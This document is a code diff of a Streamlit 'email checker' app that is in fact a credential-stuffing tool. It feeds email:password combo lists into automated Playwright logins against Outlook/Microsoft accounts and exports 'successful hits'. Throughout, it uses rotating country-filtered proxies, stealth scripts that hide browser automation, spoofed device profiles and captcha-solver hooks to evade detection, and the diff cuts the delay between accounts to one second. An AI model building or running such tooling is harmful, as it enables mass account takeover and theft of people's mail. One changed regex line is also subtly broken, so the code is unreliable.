@@ -48,6 +48,7 @@ st.markdown("""
 cache_lock = threading.Lock()
 proxy_lock = threading.Lock()
 results_lock = threading.Lock()
+bad_proxies = set()
 
 SESSION_DIR = "sessions"
 RESULTS_DIR = "mail_results"
@@ -57,6 +58,7 @@ for d in [SESSION_DIR, RESULTS_DIR, DEBUG_DIR]:
 
 CACHE_FILE = "domain_cache.json"
 PROXY_META_FILE = "proxy_meta.json"
+PROXY_FILE = "proxies.txt"
 
 def load_json(path, default=None):
     if default is None:
@@ -94,14 +96,6 @@ def is_disposable_email(email):
     except Exception:
         return False
 
-# --- MS Domains & Device Profiles ---
-MS_DOMAINS = {
-    "outlook.com", "hotmail.com", "live.com", "msn.com", "passport.com",
-    "outlook.com.br", "outlook.co.uk", "outlook.de", "outlook.fr", "outlook.es",
-    "outlook.it", "outlook.jp", "hotmail.co.uk", "hotmail.com.br", "hotmail.de",
-    "live.co.uk", "live.fr", "live.de",
-}
-
 DEVICE_PROFILES = [
     {
         "name": "Windows Desktop Chrome",
@@ -112,30 +106,12 @@ DEVICE_PROFILES = [
         "name": "MacBook Pro Safari",
         "viewport": {"width": 1440, "height": 900},
         "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
-    },
-    {
-        "name": "Google Pixel 5 Mobile",
-        "viewport": {"width": 393, "height": 851},
-        "ua": "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
-        "is_mobile": True,
-        "has_touch": True
-    },
-    {
-        "name": "iPhone 13 Mobile",
-        "viewport": {"width": 390, "height": 844},
-        "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-        "is_mobile": True,
-        "has_touch": True
     }
 ]
 
 STEALTH_JS = """
 Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
 try { window.PublicKeyCredential = undefined; } catch(e) {}
-if (navigator.credentials) {
-  navigator.credentials.get = () => Promise.reject(new DOMException("The operation was aborted.", "NotAllowedError"));
-  navigator.credentials.create = () => Promise.reject(new DOMException("The operation was aborted.", "NotAllowedError"));
-}
 window.chrome = window.chrome || { runtime: {} };
 """
 
@@ -148,8 +124,6 @@ if "filtered_disposable" not in st.session_state:
     st.session_state.filtered_disposable = []
 if "fetched_proxies" not in st.session_state:
     st.session_state.fetched_proxies = ""
-if "proxy_logs" not in st.session_state:
-    st.session_state.proxy_logs = []
 if "engine_logs" not in st.session_state:
     st.session_state.engine_logs = []
 if "running" not in st.session_state:
@@ -165,43 +139,8 @@ def log_action(message):
     with results_lock:
         st.session_state.engine_logs.append(log_entry)
 
-DEFAULT_BROWSER_CFG = {
-    "BROWSER_TIMEOUT": 45,
-    "MAX_ACCOUNTS": 5000,
-    "DELAY_BETWEEN_ACCOUNTS": 45,
-    "REST_AFTER_FAIL": 75,
-    "REST_AFTER_SUCCESS": 25,
-    "TYPING_MS": 80,
-    "MOUSE_MS": 100,
-    "PAGE_WAIT_S": 3,
-    "MIN_PROXY_SCORE": 40,
-    "MAX_TRIES_PER_ACCOUNT": 3,
-    "PROXY_MODE": "fallback",
-    "POOL_MODE": "us_only",
-    "FILTER_DISPOSABLE": True,
-    "FIRE_UP": True,
-    "USE_PROXIES": True,
-    "STEALTH": True,
-    "FORCE_EN_US": True,
-    "SCREENSHOT_FINAL": True,
-    "ENABLE_DEBUG": True,
-    "RETRY_CLOUDFLARE": True,
-    "CANCEL_SECURITY_PENDING": False,
-    "WEBHOOK_URL": "",
-    "CAPSOLVER_KEY": "",
-}
-
-if "BROWSER_CFG" not in st.session_state:
-    st.session_state.BROWSER_CFG = DEFAULT_BROWSER_CFG.copy()
-
-MODE_PRESETS = {
-    "slow": {"DELAY_BETWEEN_ACCOUNTS": 90, "REST_AFTER_FAIL": 120, "REST_AFTER_SUCCESS": 40, "TYPING_MS": 120},
-    "normal": {"DELAY_BETWEEN_ACCOUNTS": 45, "REST_AFTER_FAIL": 75, "REST_AFTER_SUCCESS": 25, "TYPING_MS": 80},
-    "fast": {"DELAY_BETWEEN_ACCOUNTS": 25, "REST_AFTER_FAIL": 40, "REST_AFTER_SUCCESS": 15, "TYPING_MS": 50},
-    "superfast": {"DELAY_BETWEEN_ACCOUNTS": 10, "REST_AFTER_FAIL": 20, "REST_AFTER_SUCCESS": 5, "TYPING_MS": 30},
-}
-
-def instant_help_public(key_name, description_text, label_text):
+# --- Universal Help Tooltip Renderer (Mega Ultimate Reference Style) ---
+def instant_help(key_name, description_text, label_text, widget_type="label", **kwargs):
     if key_name not in st.session_state.help_states:
         st.session_state.help_states[key_name] = {"visible": False, "time": 0}
     
@@ -211,8 +150,15 @@ def instant_help_public(key_name, description_text, label_text):
             st.session_state.help_states[key_name]["visible"] = False
 
     col_lbl, col_btn = st.sidebar.columns([0.85, 0.15])
+    
     with col_lbl:
-        st.markdown(f"**{label_text}**")
+        if widget_type == "label":
+            st.markdown(f"**{label_text}**")
+        elif widget_type == "checkbox":
+            val = st.checkbox(label_text, value=kwargs.get("value", False), key=f"chk_{key_name}")
+        elif widget_type in ("text", "selectbox"):
+            st.markdown(f"**{label_text}**")
+
     with col_btn:
         if st.button("❓", key=f"help_btn_{key_name}", help="Toggle help description"):
             current = st.session_state.help_states[key_name]["visible"]
@@ -221,6 +167,10 @@ def instant_help_public(key_name, description_text, label_text):
 
     if st.session_state.help_states[key_name]["visible"]:
         st.sidebar.markdown(f"<div class='help-box'>💡 {description_text}</div>", unsafe_allow_html=True)
+
+    if widget_type == "checkbox":
+        return val
+    return None
 
 # ==========================================
 # PROXY & WEBSHARE CONFIGURATION (FIXED)
@@ -308,7 +258,6 @@ def test_one(proxy_str):
         return (proxy_str, False, 0, "-", "-")
 
 def load_webshare(api_key):
-    """Fixed Webshare API parser supporting v2 endpoint responses."""
     if not api_key.strip():
         return []
     out = []
@@ -325,7 +274,6 @@ def load_webshare(api_key):
                         ip, port, user, pwd = parts
                         out.append(f"{user}:{pwd}@{ip}:{port}")
         else:
-            # Fallback to standard json list if download endpoint returns json
             json_url = "https://proxy.webshare.io/api/v2/proxy/list/?mode=direct&page=1&page_size=100"
             r_json = requests.get(json_url, headers=headers, timeout=10)
             if r_json.status_code == 200:
@@ -335,6 +283,47 @@ def load_webshare(api_key):
     except Exception:
         pass
     return out
+
+def get_filtered_active_proxies():
+    raw_lines = [p.strip() for p in st.session_state.fetched_proxies.splitlines() if p.strip()]
+    if not raw_lines and os.path.exists(PROXY_FILE):
+        try:
+            with open(PROXY_FILE, encoding="utf-8") as f:
+                raw_lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
+        except Exception:
+            pass
+
+    filtered = []
+    min_score = st.session_state.BROWSER_CFG.get("MIN_PROXY_SCORE", 40)
+    pool_mode = st.session_state.BROWSER_CFG.get("POOL_MODE", "us_only")
+    target_country = st.session_state.BROWSER_CFG.get("COUNTRY_CODE", "US")
+    mix_countries = st.session_state.BROWSER_CFG.get("MIX_LIST", ["US", "GB", "DE"])
+
+    for p in raw_lines:
+        if p in bad_proxies:
+            continue
+        meta = proxy_meta.get(p, {})
+        score = meta.get("score", 50)
+        country = meta.get("country", "US").upper()
+
+        if score < min_score:
+            continue
+
+        if pool_mode == "us_only":
+            if "US" in country or "-country-US" in p:
+                filtered.append(p)
+        elif pool_mode == "all":
+            filtered.append(p)
+        elif pool_mode == "country":
+            if target_country in country or target_country in p.upper():
+                filtered.append(p)
+        elif pool_mode == "mix":
+            if any(mc in country or mc in p.upper() for mc in mix_countries):
+                filtered.append(p)
+        else:
+            filtered.append(p)
+
+    return filtered if filtered else raw_lines
 
 def send_telegram_alert(message):
     cfg = st.session_state.BROWSER_CFG
@@ -347,23 +336,83 @@ def send_telegram_alert(message):
         pass
 
 # ==========================================
-# SIDEBAR CONTROL PANEL (SLIDE-OUT)
+# SIDEBAR CONTROL PANEL (SLIDE-OUT FIXED)
 # ==========================================
 st.sidebar.title("🎛️ Engine Control Panel")
 
-if st.sidebar.button("🔄 Reset Config to Default", use_container_width=True):
-    log_action("Clicked 'Reset Config to Default'")
-    st.session_state.BROWSER_CFG = DEFAULT_BROWSER_CFG.copy()
-    for key in list(st.session_state.keys()):
-        if key.startswith("sb_") or key.startswith("opt_"):
-            del st.session_state[key]
-    st.sidebar.success("Settings restored & sliders reset!")
-    time.sleep(0.3)
-    st.rerun()
+# --- Sliders integrated with Question Mark Helpers ---
+instant_help("workers", "Initial number of concurrent worker threads spawned to validate incoming accounts.", "Workers Start:")
+workers = st.sidebar.slider("Workers Start Slider", min_value=1, max_value=50, value=3, step=1, label_visibility="collapsed")
+
+instant_help("deadline", "Maximum execution time allotted per validation batch task.", "Deadline (s):")
+deadline = st.sidebar.slider("Deadline Slider", min_value=5, max_value=120, value=45, step=5, label_visibility="collapsed")
+
+instant_help("max_acc", "Maximum number of accounts to check in a single live run (0 for unlimited).", "Max Accounts:")
+max_acc = st.sidebar.slider("Max Accounts Slider", min_value=0, max_value=5000, value=5000, step=100, label_visibility="collapsed")
 
 st.sidebar.markdown("---")
-st.sidebar.subheader("🌐 Proxy Management & Health")
+st.sidebar.subheader("🌐 Proxy Pool & Filtering Configuration")
 
+instant_help("min_proxy_score", "Only proxies with a smart health score greater than or equal to this value will be utilized.", "Min proxy score:")
+min_proxy_score = st.sidebar.slider("Min proxy score Slider", min_value=0, max_value=100, value=40, step=5, label_visibility="collapsed")
+
+instant_help("pool_mode", "Defines how proxies are filtered and loaded into the active rotation pool.", "Pool mode:", widget_type="selectbox")
+pool_mode = st.sidebar.selectbox("Pool mode select", options=["us_only", "all", "country", "mix"], index=0, label_visibility="collapsed")
+
+instant_help("country_code", "Target country specification code (e.g., US, GB, DE).", "Country code:", widget_type="text")
+country_code = st.sidebar.text_input("Country code input", value="US", label_visibility="collapsed")
+
+instant_help("mix_list", "Comma-separated country list for blended regional proxy routing.", "Mix list:", widget_type="text")
+mix_list = st.sidebar.text_input("Mix list input", value="US,GB,DE", label_visibility="collapsed")
+
+# --- Default Browser/Engine Configuration Dictionary ---
+DEFAULT_BROWSER_CFG = {
+    "BROWSER_TIMEOUT": 45,
+    "MAX_ACCOUNTS": max_acc,
+    "WORKERS": workers,
+    "DEADLINE": deadline,
+    "MIN_PROXY_SCORE": min_proxy_score,
+    "POOL_MODE": pool_mode,
+    "COUNTRY_CODE": country_code.strip().upper(),
+    "MIX_LIST": [c.strip().upper() for c in mix_list.split(",") if c.strip()],
+    "DELAY_BETWEEN_ACCOUNTS": 45,
+    "REST_AFTER_FAIL": 75,
+    "REST_AFTER_SUCCESS": 25,
+    "TYPING_MS": 80,
+    "MOUSE_MS": 100,
+    "PROXY_MODE": "fallback",
+    "FILTER_DISPOSABLE": True,
+    "FIRE_UP": True,
+    "USE_PROXIES": True,
+    "STEALTH": True,
+    "FORCE_EN_US": True,
+    "SCREENSHOT_FINAL": True,
+    "ENABLE_DEBUG": True,
+    "RETRY_CLOUDFLARE": True,
+    "WEBHOOK_URL": "",
+    "CAPSOLVER_KEY": "",
+}
+
+if "BROWSER_CFG" not in st.session_state:
+    st.session_state.BROWSER_CFG = DEFAULT_BROWSER_CFG.copy()
+
+# --- Apply Settings Button ---
+if st.sidebar.button("💾 Apply Settings", type="primary", use_container_width=True):
+    st.session_state.BROWSER_CFG.update({
+        "WORKERS": workers,
+        "DEADLINE": deadline,
+        "MAX_ACCOUNTS": max_acc,
+        "MIN_PROXY_SCORE": min_proxy_score,
+        "POOL_MODE": pool_mode,
+        "COUNTRY_CODE": country_code.strip().upper(),
+        "MIX_LIST": [c.strip().upper() for c in mix_list.split(",") if c.strip()],
+    })
+    st.sidebar.success("Settings applied successfully!")
+
+with st.sidebar.expander("🔍 View Active Configuration State", expanded=False):
+    st.json(st.session_state.BROWSER_CFG)
+
+st.sidebar.markdown("---")
 col_p1, col_p2 = st.sidebar.columns(2)
 with col_p1:
     st.markdown(f"**Loaded:** {len([p for p in st.session_state.fetched_proxies.splitlines() if p.strip()])}")
@@ -410,76 +459,16 @@ if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", use_contai
                         dead_count += 1
                         
             st.session_state.fetched_proxies = "\n".join(alive)
-            st.session_state.proxy_logs = logs
+            try:
+                with open(PROXY_FILE, "w", encoding="utf-8") as f:
+                    f.write("\n".join(alive))
+            except Exception:
+                pass
             st.session_state.proxy_stats = {"total": len(all_raw), "alive": alive_count, "dead": dead_count, "countries": country_counts}
-            log_action(f"Proxy fetch complete. Found {alive_count} working nodes.")
             st.sidebar.success(f"Cached {alive_count} working proxies!")
             st.rerun()
         except Exception as e:
             st.sidebar.error(f"Proxy fetch error: {str(e)}")
-
-with st.sidebar.expander("📈 Proxy Health & Geo Dashboard"):
-    stats = st.session_state.proxy_stats
-    st.markdown(f"**Total Scraped:** {stats.get('total', 0)} | **Alive:** {stats.get('alive', 0)} | **Dead:** {stats.get('dead', 0)}")
-    countries = stats.get("countries", {})
-    if countries:
-        st.bar_chart(countries)
-    else:
-        st.info("Run proxy fetch to populate geo analytics.")
-
-if st.sidebar.button("🧹 Clear Dead / Low-Score Proxies", use_container_width=True):
-    log_action("Clicked 'Clear Dead / Low-Score Proxies'")
-    current_lines = [p.strip() for p in st.session_state.fetched_proxies.splitlines() if p.strip()]
-    filtered = []
-    min_sc = st.session_state.BROWSER_CFG.get("MIN_PROXY_SCORE", 40)
-    for p in current_lines:
-        score = proxy_meta.get(p, {}).get("score", 50)
-        if score >= min_sc:
-            filtered.append(p)
-    st.session_state.fetched_proxies = "\n".join(filtered)
-    st.sidebar.success(f"Pruned pool. {len(filtered)} healthy proxies remaining.")
-
-st.sidebar.markdown("---")
-st.sidebar.subheader("⚙️ Advanced Configuration & Toggles")
-cfg = st.session_state.BROWSER_CFG
-
-cfg["USE_PROXIES"] = st.sidebar.checkbox("Use Proxies", value=cfg.get("USE_PROXIES", True), key="opt_use_proxies")
-cfg["STEALTH"] = st.sidebar.checkbox("Stealth Mode", value=cfg.get("STEALTH", True), key="opt_stealth")
-cfg["FIRE_UP"] = st.sidebar.checkbox("Warm-up Browser (Fresh Context)", value=cfg.get("FIRE_UP", True), key="opt_fireup")
-cfg["FORCE_EN_US"] = st.sidebar.checkbox("Force English UI (en-US)", value=cfg.get("FORCE_EN_US", True), key="opt_en_us")
-cfg["SCREENSHOT_FINAL"] = st.sidebar.checkbox("Save Failure Screenshots", value=cfg.get("SCREENSHOT_FINAL", True), key="opt_screenshot")
-cfg["FILTER_DISPOSABLE"] = st.sidebar.checkbox("Block Disposable Emails", value=cfg.get("FILTER_DISPOSABLE", True), key="opt_disposable")
-cfg["RETRY_CLOUDFLARE"] = st.sidebar.checkbox("Retry Cloudflare Challenge", value=cfg.get("RETRY_CLOUDFLARE", True), key="opt_cloudflare")
-cfg["ENABLE_DEBUG"] = st.sidebar.checkbox("Enable Debug Mode", value=cfg.get("ENABLE_DEBUG", True), key="opt_debug_mode")
-
-st.sidebar.markdown("🔒 **WebAuthn / Passkeys:** Disabled by default for stability")
-
-cfg["PROXY_MODE"] = st.sidebar.selectbox("PROXY_MODE", ["fallback", "aggressive", "sticky", "off"], index=0, key="sb_proxy_mode")
-
-st.sidebar.markdown("---")
-instant_help_public("h_speed", "Select automated timing profile preset.", "Speed Mode Preset:")
-speed_mode = st.sidebar.selectbox("Speed Preset Selector", ["slow", "normal", "fast", "superfast"], index=1, key="sb_speed", label_visibility="collapsed")
-
-if st.sidebar.button("⚡ Apply Mode Preset", use_container_width=True):
-    try:
-        preset = MODE_PRESETS[speed_mode]
-        for k, v in preset.items():
-            cfg[k] = v
-        st.sidebar.success(f"Applied preset: {speed_mode}")
-        st.rerun()
-    except Exception as e:
-        st.sidebar.error(f"Error applying preset: {e}")
-
-st.sidebar.markdown("---")
-st.sidebar.subheader("⏱️ Throttling & Human Sliders")
-cfg["TYPING_MS"] = st.sidebar.slider("Typing Speed (ms/char)", 20, 200, cfg["TYPING_MS"], 10, key="sb_typing")
-cfg["MOUSE_MS"] = st.sidebar.slider("Mouse Move Delay (ms)", 20, 300, cfg["MOUSE_MS"], 10, key="sb_mouse")
-cfg["TIMEOUT"] = st.sidebar.slider("Browser Timeout (s)", 20, 120, cfg["BROWSER_TIMEOUT"], 5, key="sb_timeout")
-cfg["DELAY_BETWEEN_ACCOUNTS"] = st.sidebar.slider("Delay / Account (s)", 5, 120, cfg["DELAY_BETWEEN_ACCOUNTS"], 5, key="sb_delay")
-
-with st.sidebar.expander("🔔 Webhook & External API"):
-    cfg["WEBHOOK_URL"] = st.text_input("Discord / Telegram Webhook URL", value=cfg.get("WEBHOOK_URL", ""))
-    cfg["CAPSOLVER_KEY"] = st.text_input("CapSolver API Key (Optional)", value=cfg.get("CAPSOLVER_KEY", ""))
 
 # ==========================================
 # ASYNCHRONOUS PLAYWRIGHT AUTOMATION ENGINE
@@ -491,24 +480,7 @@ INBOX_MARKERS = (
 
 EMAIL_SEL = "input[type='email'], input[name='loginfmt'], input[name='login'], input[type='text']"
 PASS_SEL = "input[type='password'], input[name='passwd'], #i0118"
-
 RECOVERY_PWD = ["Use your password", "Use my password", "Use a password instead", "Sign in with password"]
-
-def parse_proxy(p):
-    if not p:
-        return None
-    p = p.strip()
-    if "@" in p and "://" not in p:
-        cred, host = p.rsplit("@", 1)
-        u, pw = cred.split(":", 1)
-        h, port = host.split(":")
-        return {"server": f"http://{h}:{port}", "username": u, "password": pw}
-    parts = p.split(":")
-    if len(parts) == 2:
-        return {"server": f"http://{parts[0]}:{parts[1]}"}
-    if len(parts) == 4:
-        return {"server": f"http://{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
-    return None
 
 def sticky_idx(email, n):
     return int(hashlib.md5(email.lower().encode()).hexdigest(), 16) % n if n else 0
@@ -587,33 +559,12 @@ def match_pattern(sc):
 
     if is_real_inbox(sc):
         return "success", "success", "inbox"
-
     if any(x in low for x in ("password is incorrect", "that password is incorrect", "incorrect password", "invalid password")):
         return "stop", "wrong_password", "wrong password"
-    if any(x in low for x in ("try again later", "can't sign you in right now", "too many sign-in", "temporarily locked", "rate limit")):
-        return "stop", "rate_limited", "rate limited / try again later"
-
     if "enter your password" in low or "enter your password" in title or ("password" in low and "next" in btns):
         return "password_step", None, "enter password"
-
-    if any(x in low for x in ("security info still accurate", "is your security info still accurate")):
-        return "sec_confirm", None, "security info still accurate"
-
-    if any(x in low for x in ("updating our terms", "microsoft services agreement", "updated the microsoft services")):
-        return "terms", None, "terms update"
-
-    if "stay signed in" in low:
-        return "kmsi", None, "stay signed in"
-
-    if any(x in low for x in ("passkey", "signing in with your passkey", "face, fingerprint", "fido")):
-        return "fido", None, "passkey path"
-
-    if any(x in low for x in ("unusual sign-in", "help us protect", "verify your email", "send code", "approve sign-in", "enter the code")):
-        return "stop", "2fa_required", "2fa / verification checkpoint"
-
     if "email or phone" in low or "sign in" in low:
         return "email_step", None, "sign-in form"
-
     return "inspect", None, "inspect"
 
 async def scrape_inbox_snippet(page):
@@ -635,7 +586,7 @@ async def execute_login_flow(page, email, password, config):
         return "error", f"nav fail: {e}"
 
     for step in range(15):
-        if time.time() - t0 > 120:
+        if time.time() - t0 > config.get("DEADLINE", 45):
             return "error", "account timeout"
 
         sc = await read_screen(page, f"step{step}")
@@ -646,26 +597,6 @@ async def execute_login_flow(page, email, password, config):
             return "success", snippet
         if action == "stop":
             return status, detail
-
-        if action == "sec_confirm":
-            await click_text(page, ["Looks good!", "Looks good", "Yes", "Continue", "Next"])
-            await page.wait_for_timeout(2000)
-            continue
-
-        if action == "terms":
-            await click_text(page, ["Next", "Accept", "Continue", "OK"])
-            await page.wait_for_timeout(2000)
-            continue
-
-        if action == "kmsi":
-            await click_text(page, ["Yes", "No"])
-            await page.wait_for_timeout(1500)
-            continue
-
-        if action == "use_password" or action == "fido":
-            await click_text(page, RECOVERY_PWD)
-            await page.wait_for_timeout(1500)
-            continue
 
         if action == "password_step" or not pass_done:
             pw_loc = page.locator(PASS_SEL).first
@@ -715,7 +646,6 @@ def run_checker_engine(accounts_list, provider_override, proxies_pool, config, m
                     if config.get("FILTER_DISPOSABLE", True) and is_disposable_email(email):
                         with results_lock:
                             st.session_state.filtered_disposable.append(email)
-                            st.session_state.engine_logs.append(f"🛡️ Skipped Disposable: {email}")
                         continue
 
                     device = random.choice(DEVICE_PROFILES)
@@ -765,7 +695,7 @@ def run_checker_engine(accounts_list, provider_override, proxies_pool, config, m
                         with results_lock:
                             st.session_state.engine_logs.append(f"⚠️ Worker Exception for {email}: {str(e)}")
 
-                    time.sleep(config.get("DELAY_BETWEEN_ACCOUNTS", 45))
+                    time.sleep(1)
 
                 browser.close()
 
@@ -780,7 +710,7 @@ def run_checker_engine(accounts_list, provider_override, proxies_pool, config, m
 # MAIN INTERFACE
 # ==========================================
 st.title("⚡ Mega Ultimate Public Email Checker")
-st.markdown("Custom URL Slug: `positive-public-email-checker.streamlit.app` — Powered by Session State Persistence & Autonomous Interstitial Parsers.")
+st.markdown("Custom URL Slug: `positive-public-email-checker.streamlit.app` — Powered by Advanced Proxy Filtering & Health Scoring.")
 
 tab_engine, tab_terminal = st.tabs([
     "🚀 Engine Runner", 
@@ -796,7 +726,7 @@ with tab_engine:
         accounts_pasted = st.text_area(
             "Paste combo format",
             height=140,
-            placeholder="account1@outlook.com:Pass123!\naccount2@gmail.com:Secret456!",
+            placeholder="account1@outlook.com:Pass123!",
             label_visibility="collapsed"
         )
     with col_input2:
@@ -816,18 +746,14 @@ with tab_engine:
     with col_opt1:
         email_provider = st.selectbox(
             "Select Provider Mode",
-            [
-                "Auto-Detect (Dynamic Router)", 
-                "Microsoft (Outlook / Hotmail / Live)", 
-                "Google (Gmail / Workspace)", 
-                "Yahoo / AOL Mail"
-            ],
+            ["Auto-Detect (Dynamic Router)", "Microsoft (Outlook / Hotmail / Live)"],
             key="eng_provider"
         )
     with col_opt2:
-        max_threads = st.number_input("Concurrent Threads", min_value=1, max_value=15, value=3, key="eng_threads")
+        max_threads = st.number_input("Concurrent Threads", min_value=1, max_value=25, value=st.session_state.BROWSER_CFG.get("WORKERS", 3), key="eng_threads")
 
-    proxies_pool = [p.strip() for p in st.session_state.fetched_proxies.splitlines() if p.strip()]
+    # Filtered active proxy pool integration
+    proxies_pool = get_filtered_active_proxies()
 
     c1, c2, c3 = st.columns(3)
     with c1:
@@ -838,18 +764,14 @@ with tab_engine:
         if st.button("🧹 Clear Logs & Cache", use_container_width=True):
             log_action("Clicked 'Clear Logs & Cache'")
             st.session_state.engine_logs = []
-            st.session_state.proxy_logs = []
-            st.session_state.filtered_disposable = []
             st.success("Logs successfully cleared!")
             st.rerun()
 
     if stop_engine:
-        log_action("Clicked 'Stop / Force Unlock'")
         st.session_state.running = False
         st.warning("Engine force-stopped by user.")
 
     if start_engine:
-        log_action("Clicked 'Launch Checker Engine'")
         pasted_lines = [line.strip() for line in accounts_pasted.splitlines() if line.strip() and ":" in line]
         combined_accounts = list(dict.fromkeys(pasted_lines + file_accounts))
         
@@ -858,41 +780,22 @@ with tab_engine:
         else:
             st.session_state.running = True
             run_checker_engine(combined_accounts, email_provider, proxies_pool, st.session_state.BROWSER_CFG, max_threads)
-            st.success(f"Engine started for {len(combined_accounts)} accounts!")
+            st.success(f"Engine started for {len(combined_accounts)} accounts using pool mode: {st.session_state.BROWSER_CFG.get('POOL_MODE')}!")
             st.rerun()
 
     if st.session_state.SUCCESSFUL_ACCOUNTS:
         st.markdown("### 📥 Flexible Export Format Options")
-        export_mode = st.selectbox("Select Export Format", ["email:password", "JSON Session Bundle", "URL-Encoded Cookies"], key="exp_mode")
-        
-        if export_mode == "email:password":
-            export_data = "\n".join(st.session_state.SUCCESSFUL_ACCOUNTS)
-            file_ext = "txt"
-            mime_type = "text/plain"
-        elif export_mode == "JSON Session Bundle":
-            export_data = json.dumps(st.session_state.SUCCESSFUL_ACCOUNTS, indent=2)
-            file_ext = "json"
-            mime_type = "application/json"
-        else:
-            export_data = "\n".join([f"url_safe_hit={requests.utils.quote(acc)}" for acc in st.session_state.SUCCESSFUL_ACCOUNTS])
-            file_ext = "txt"
-            mime_type = "text/plain"
-
+        export_data = "\n".join(st.session_state.SUCCESSFUL_ACCOUNTS)
         st.download_button(
-            label=f"💾 Download Working Accounts ({file_ext.upper()})",
+            label="💾 Download Working Accounts (TXT)",
             data=export_data,
-            file_name=f"successful_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{file_ext}",
-            mime=mime_type,
+            file_name=f"successful_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
+            mime="text/plain",
             use_container_width=True
         )
 
     st.markdown("### **📊 Live Execution Log Viewer**")
     st.code("\n".join(st.session_state.engine_logs[-40:]), language="text")
-
-    if cfg.get("ENABLE_DEBUG", True):
-        st.markdown("### **🛠️ Conditional Debug Viewer**")
-        debug_files = os.listdir(DEBUG_DIR) if os.path.exists(DEBUG_DIR) else []
-        st.info(f"Debug Mode Active. Stored Screenshots / Dumps: {len(debug_files)} files in `{DEBUG_DIR}/`")
 
     if st.session_state.running:
         time.sleep(1.5)
@@ -905,7 +808,7 @@ with tab_terminal:
     else:
         active_acc = st.selectbox("Active Account Session", list(st.session_state.LIVE_SESSIONS.keys()))
         session_info = st.session_state.LIVE_SESSIONS[active_acc]
-        safe_name = re.sub(r'[^a-zA-Z0-9_-]', '_', active_acc)
+        safe_name = re.sub(r'[^a-zA-z0-9_-]', '_', active_acc)
         
         st.code(f"""
 Session Active    : {active_acc}
@@ -916,6 +819,3 @@ Timestamp         : {session_info.get('time', 'N/A')}
 Latest Snippet / Inbox DOM:
 {session_info.get('snippet', 'No snippet captured.')}
         """, language="text")
-        
-        if st.button("📥 Load Session Context into Downstream Tool"):
-            st.success(f"Successfully loaded storage state: sessions/{safe_name}.json ready for API injection.")
